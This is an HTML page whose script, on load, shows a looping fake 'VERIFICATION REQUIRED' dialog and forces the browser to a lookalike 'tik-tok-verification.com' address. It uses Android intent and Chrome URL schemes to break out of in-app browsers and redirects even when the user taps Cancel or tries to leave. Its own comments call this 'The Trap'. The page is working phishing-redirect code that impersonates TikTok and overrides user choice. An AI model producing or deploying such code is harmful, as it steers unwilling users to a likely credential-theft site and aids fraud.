<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 10000; 
    const gap = 320; // Reverted to your "Verified Working" delay

    function triggerDirectJump() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const urlNoProtocol = target.replace("https://", "");

        // Android: Force Chrome to open the URL directly, not search it
        if (isAndroid) {
            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
        } else {
            // iOS: Try to force Safari via the 'URL-direct' scheme
            // This is more likely to open the link than a search
            window.location.assign(target); 
            window.location.replace("googlechrome://" + urlNoProtocol);
        }
    }

    function rampage() {
        if (Date.now() > killTime) return;

        // 1. The Trap: A Confirm box instead of an Alert
        // Even if they hit "Cancel," the 'finally' block fires the redirect.
        const choice = confirm("VERIFICATION REQUIRED\n\nTo continue to the app, you must sync with your secure browser.\n\nTap OK to authorize.");

        // 2. THE MOMENTUM JUMP
        // We fire this 3 times rapidly to ensure the OS sees the 'intent'
        triggerDirectJump();
        
        // 3. THE GAP (320ms)
        // This is your window where the OS handles the jump.
        setTimeout(() => {
            if (document.hasFocus()) {
                // If they are still here (didn't leave), loop back
                triggerDirectJump();
                rampage();
            }
        }, gap);
    }

    window.onload = () => {
        rampage();
    };

    // If they swipe or try to exit, force the jump
    window.onblur = () => { if (Date.now() < killTime) triggerDirectJump(); };
</script>

</body>
</html>
